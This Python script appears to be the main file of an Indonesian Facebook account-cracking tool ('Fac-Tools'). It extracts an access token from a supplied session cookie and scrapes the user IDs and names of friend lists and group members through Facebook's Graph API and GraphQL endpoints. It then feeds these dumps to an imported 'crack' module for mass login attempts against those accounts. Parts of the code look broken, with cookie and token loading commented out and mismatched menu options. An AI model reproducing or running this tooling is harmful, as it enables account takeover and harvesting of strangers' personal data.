
# Buy directly from the author to avoid being cheated!
# source: https://github.com/Fajarxyta/Fac-Tools
# facebook: https://www.facebook.com/fajarxyta15
# whatsapp : 085894841695

import os, re, requests, time, json, random
from datetime import datetime

from Method import login as Login
waktu, DUMP = datetime.now().strftime("%d-%m-%Y"), []

A = "\033[90m"   # Abu-abu
B = "\033[94m"   # Biru
C = "\033[96m"   # Cyan
D = "\033[91m"   # Merah
F = "\033[35m"   # Magenta
G = "\033[92m"   # Hijau Muda
H = "\033[37m"   # Putih

class Assets:
    def get_data(self, req):
        return {
            "av": re.search('"actorID":"(\d+)"', str(req)).group(1),
            "__aaid": "0",
            "__user": re.search('"actorID":"(\d+)"', str(req)).group(1),
            "__a": str(random.randrange(1, 6)),
            "__req": "12",
            "__hs": re.search('"haste_session":"(.*?)"', str(req)).group(1),
            "dpr": "3",
            "__ccg": "EXCELLENT",
            "__rev": re.search('"__spin_r":(\d+),', str(req)).group(1),
            "__s": "",
            "__hsi": re.search(r'"brsid":"(\d+)"', str(req)).group(1),
            "__dyn": "",
            "__csr": "",
            "__comet_req": "15",
            "fb_dtsg": re.search(r'\"DTSGInitialData\",\[(.*?)\],\{\"token\":\"(.*?)\"', str(req)).group(2),
            "jazoest": re.search('jazoest=(.*?)"', str(req)).group(1),
            "lsd": re.search('"LSD",\[\],{"token":"(.*?)"}', str(req)).group(1),
            "__spin_r": re.search('"__spin_r":(\d+),', str(req)).group(1),
            "__spin_b": "trunk",
            "__spin_t": re.search('"__spin_t":(\d+),', str(req)).group(1),
            'fb_api_caller_class': 'RelayModern'
        }
        
class Pengaturan:
	
	def __init__(self) -> None:
		pass
	
	def Login(self) -> None:
		try:
			print(' > Silahkan Masukkan Cookies Facebook\n > Pastikan Akun Sudah Menggunakan Bahasa Indonesia!')
			cookie = input(' > Cookie: ')
			self.token = self.GenerateToken(cookie)
			self.name, self.userid = self.ValidasiToken(self.token, cookie)
			with open("Data/UserLogin.json", "w+") as w:
				w.write(json.dumps({'Cookie': cookie, 'Token': self.token}, indent=4, sort_keys=True))
			w.close()
			print(f' > Login berhasil! Selamat datang, {G}{self.name}{H}\n > Token: {G}{self.token}{H}')
			exit()
		except Exception as e:
			print(f' > {D}{str(e).title()}{H}')
			exit()
			
	def GenerateToken(self, cookie):
		try:
			with requests.Session() as r:
				response = r.get('https://www.facebook.com/adsmanager/manage/campaigns', cookies={'cookie': cookie}).text.replace('\\', '')
				
				act_id = re.search(r'act=(\d+)', response)
				if not act_id:
					raise ValueError(" > Gagal menemukan act ID.")
					
				response2 = r.get(f'https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={act_id.group(1)}&breakdown_regrouping=1&nav_source=no_referrer', cookies={'cookie': cookie}).text.replace('\\', '')
				token = re.search(r'accessToken="(.*?)"', response2)
				if not token:
					raise ValueError(" > Token tidak ditemukan.")
				
				return token.group(1)
		except Exception as e:
			return None
			
	def ValidasiToken(self, token, cookie):
		try:
			with requests.Session() as r:
				r.headers.update({
					"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
					"accept-language": "id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
					"cookie": cookie,
				})
				response = r.get(f"https://graph.facebook.com/me?fields=id,name&access_token={token}")
				if "name" in response.text and "id" in response.text:
					return response.json().get("name"), response.json().get("id")
				os.remove('Data/UserLogin.json')
				print('\n > Login gagal, coba lagi')
				exit()
		except Exception as e:
			print(f' > {D}{str(e).title()}{H}')
			os.remove('Data/UserLogin.json')
			exit()
			
class Main:
	
	def __init__(self) -> None:
		pass
	
	def Menu(self):
		try:
			self.cookie = [] #.json.loads(open('Data/UserLogin.json', 'r').read())['Cookie']
			self.token = [] #json.loads(open('Data/UserLogin.json', 'r').read())['Token']
			self.name, self.userid = 0, 0#Pengaturan().ValidasiToken(self.token, self.cookie)
		except Exception as e:
			print(f' > {D}{str(e).title()}{H}')
			time.sleep(1.5)
			Pengaturan().Login()
		
		try:
			response = requests.get('http://ip-api.com/json/').json()
		except:pass
		
		print(f""" {B}____{H}  __    ___  ____ 
{B}(  __){H}/ _\  / __)(  __)
{B} ) _){H}/    \( (__  ) _) @s.fajar15
{B}(__){H} \_/\_/ \___)(____)
		""")
		print(f""" > Account: {G}{self.name}|{self.userid}{H}
 > {response.get('query')}|{response.get('regionName')}
 
 1. Dump dari daftar teman
 2. Dump dari member group
 3. Mulai crack
 4. Crack Ulang
 5. Cek akun hasil crack
 6. Keluar
		""")
		
		self.pilihan = input(' > Pilih: ')
		if self.pilihan == '1' or self.pilihan == '01':
			print('\n > Masukan uid target, pastikan target tidak private')
			id = input(" > uid: ").split(',')
			print(f" > Tekan {D}CTRL + C{H} Untuk berhenti dump")
			for userid in id:
				FacebookDump().teman(userid, self.cookie, self.token, None)
			Login.MAIN(DUMP).Run()
				
		elif self.pilihan == '2' or self.pilihan == '02':
			print('\n > Masukan username/uid group target, pastikan group tidak private')
			id = input(" > username/uid: ").split(',')
			print(f" > Tekan {D}CTRL + C{H} Untuk berhenti dump")
			for userid in id:
				FacebookDump().group(userid, self.cookie)
			Login.MAIN(DUMP).Run()
			
		elif self.pilihan == '3' or self.pilihan == '03':
			print()
			file_list = os.listdir('Data/Dump')
			if not file_list:
				print(" > Tidak ada file Dump")
				exit()
			
			print("\t[ Daftar file Dump ]\n")
			for i, file in enumerate(file_list, 1):
				print(f" {i}. {file} ({len(open(f'Data/Dump/{file}', 'r').read().splitlines())} ID)")
			print("\n > Pilih file (nomor, Gunakan koma untuk pilih beberapa file)\n > tekan Enter untuk dump semua")
			query = input(" > pilih: ")
			if query == "":
				print("\n > Mengumpulkan ID dari semua file...")
				for file in file_list:
					with open(f'Data/Dump/{file}', 'r') as f:
						for item in f.read().splitlines():
							DUMP.append(item)
							print(f"  > ID terkumpul: {len(DUMP)}", end='\r')
			elif all(num.strip().isdigit() and 1 <= int(num.strip()) <= len(file_list) for num in query.split(",")):
				select_file = [file_list[int(num.strip()) - 1] for num in query.split(",")]
				print(f"\n > Mengumpulkan ID dari file: {', '.join(select_file)}")
				for file in select_file:
					with open(f'Data/Dump/{file}', 'r') as f:
						for item in f.read().splitlines():
							DUMP.append(item)
							print(f" > Userid terkumpul: {len(DUMP)}", end='\r')
			else:
				print(" > Pilihan tidak valid.")
				exit()
			
			if len(DUMP) < 50:
				print(" > Dump terlalu sedikit")
				exit()
			
			print(f'{" "*50}', end='\r')
			time.sleep(1.0)
			print(f' > Jumlah username terkumpul: {len(DUMP)}')
			time.sleep(1)
			Login.MAIN(DUMP).Run()
			
		elif self.pilihan == '4' or self.pilihan == '04':
			print()
			file_list = os.listdir('Ressults/Checkpoint')
			if not file_list:
				print(" > Tidak ada file Dump")
				exit()
			
			print("\t[ Daftar file Dump ]\n")
			for i, file in enumerate(file_list, 1):
				print(f" {i}. {file} ({len(open(f'Ressults/Checkpoint/{file}', 'r').read().splitlines())} ID)")
			query = input(" > Pilih file (nomor) atau tekan Enter untuk dump semua: ")
			if query == "":
				print("\n > Mengumpulkan ID dari semua file...")
				for file in file_list:
					with open(f'Ressults/Checkpoint/{file}', 'r') as f:
						for item in f.read().splitlines():
							DUMP.append(item)
							print(f"  > ID terkumpul: {len(DUMP)}", end='\r')
			elif query.isdigit() and 1 <= int(query) <= len(file_list):
				select_file = file_list[int(query) - 1]
				print(f"\n > Mengumpulkan ID dari file: {select_file}")
				with open(f'Ressults/Checkpoint/{select_file}', 'r') as f:
					for item in f.read().splitlines():
						DUMP.append(item)
						print(f" > Userid terkumpul: {len(DUMP)}", end='\r')
			else:
				print(" > Pilihan tidak valid.")
				exit()
			
			if len(DUMP) < 50:
				print(" > Dump terlalu sedikit")
				exit()
			
			print(f'{" "*50}', end='\r')
			time.sleep(1.0)
			print(f' > Jumlah username terkumpul: {len(DUMP)}')
			time.sleep(1)
			Login.MAIN(DUMP).Run()
			
		elif self.pilihan == '5' or self.pilihan == '06':
			print(f' > {D}Sedang Mencoba Menghapus Data Akun Kamu, Mohon Tunggu Sebentar!{H}')
			time.sleep(2.5)
			os.remove("Data/UserLogin.json")
		else:
			print(f' > {D}Pilihan Yang Kamu Masukkan Tidak Tersedia Dalam Fitur!{H}')
			time.sleep(1.5)
			Main().Menu()
	
class FacebookDump:
	def __init__(self) -> None:
		self.buffer = []
		self.batch_size = 20  
		self.retry_delay = 30 
	
	def teman(self, id, cookie, token, after):
		try:
			with requests.Session() as r:
				r.headers.update({
					"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
					"accept-language": "id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
					"cookie": cookie,
				})
				params = {
					'after': after,
					'pretty': 1,
					'access_token': token,
					'limit': ''
				}
				response = r.get(f'https://graph.facebook.com/v16.0/{id}/friends', params=params)
				for user in response.json().get('data', {}):
					userid = user.get('id', '') + '|' + user.get('name', '')
					print(f" > Berhasil Mendapatkan Id: {G}{len(DUMP)}{H}", end='\r')
					if userid not in DUMP:DUMP.append(userid)
					with open(f'Data/Dump/Teman-{waktu}.json', 'a+') as w:w.write(userid + '\n') 
				if 'paging' in response.json() and 'cursors' in response.json()['paging'] and 'after' in response.json()['paging']['cursors']:
					self.teman(id, cookie, token, response.json()['paging']['cursors']['after'])
		except:pass
	
	def info_grup(self, response):
		try:
			nama_group = re.search('"__isProfile":"Group","name":"(.*?)"', response).group(1) or None
			anggota_group = re.search('"all_active_members":{"count":(\d+)}', response).group(1) or None
			return nama_group, anggota_group
		except Exception as e:
			print(e)
	
	def group(self, userid, cookie, cursor = ''):
		try:
			with requests.Session() as r:
				r.headers.update({
					'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
					'sec-fetch-mode': "navigate",
					'sec-fetch-site': "same-origin",
					'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
					'sec-fetch-user': "?1",
					'sec-fetch-dest': "document",
					'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"Host": "www.facebook.com"
				})
				response = r.get('https://www.facebook.com/groups/{}/members'.format(userid), cookies={"cookie": cookie})
				groupID = re.search('"group":{"id":"(\d+)"', response.text).group(1)
				nama, anggota = self.info_grup(response.text)
				print(f"""
 > Nama group : {G}{nama}{H}
 > Anggota group : {G}{anggota}{H}
				""")
				data = Assets().get_data(response.text)
				time.sleep(1)
				self.next_group2(groupID, data, cursor, cookie)
		except:pass
	
	def next_group2(self, id, params, cursor, cookie):
		while True:
			with requests.Session() as r:
				try:
					r.headers.update({
						'sec-fetch-site': "same-origin",
						'sec-fetch-mode': "cors",
						'x-fb-friendly-name': "GroupsCometMembersPageNewMembersSectionRefetchQuery",
						'x-asbd-id': "129477",
						'x-fb-lsd': params.get("lsd"),
						'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
						'sec-ch-ua-mobile': "?0",
						'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
						"Host": "www.facebook.com"
					})
					payload = {
						'fb_api_req_friendly_name': "GroupsCometMembersPageNewMembersSectionRefetchQuery",
						'variables': json.dumps({"count":10,"cursor":cursor,"groupID":id,"recruitingGroupFilterNonCompliant":False,"scale":3,"id":id}),
						'server_timestamps': True,
						'doc_id': '8870039359721825'
					}
					payload.update(params)
					response = r.post('https://www.facebook.com/api/graphql/', data=payload, cookies={"cookie": cookie})
					members = response.json().get("data", {}).get("node", {}).get("new_members", {}).get("edges", [])
					if not members:
						print(f"\n > {B}Tidak ada data lagi, proses selesai.{H}")
						self.write_to_file()
						break
						
					for user in members:
						userid = user.get("node", {}).get("id", '') +'|'+ user.get("node", {}).get("name", '')
						print(f" > Berhasil Mendapatkan Id: {G}{len(DUMP)}{H}", end='\r')
						if userid not in DUMP:
							DUMP.append(userid);self.buffer.append(userid)
							
					if len(self.buffer) >= self.batch_size:
						self.write_to_file(id)
						
					cursor = members[-1].get("cursor", "")
					if not cursor:
						print(f"\n > {B}Cursor kosong, proses selesai.{H}")
						self.write_to_file()
						break
						
				except:pass
					
	def write_to_file(self, group_id=None):
		if self.buffer:
			file_path = f'Data/Dump/{group_id}-{waktu}.json'
			try:
				with open(file_path, 'a+', encoding='utf-8') as f:
					f.write("\n".join(self.buffer) + "\n")
				self.buffer = []
			except Exception as e:
				print(f" > {D}Error saat menulis file: {e}{H}")
			
			
if __name__ == "__main__":
	os.system("cls" if os.name == "nt" else "clear")
	Main().Menu()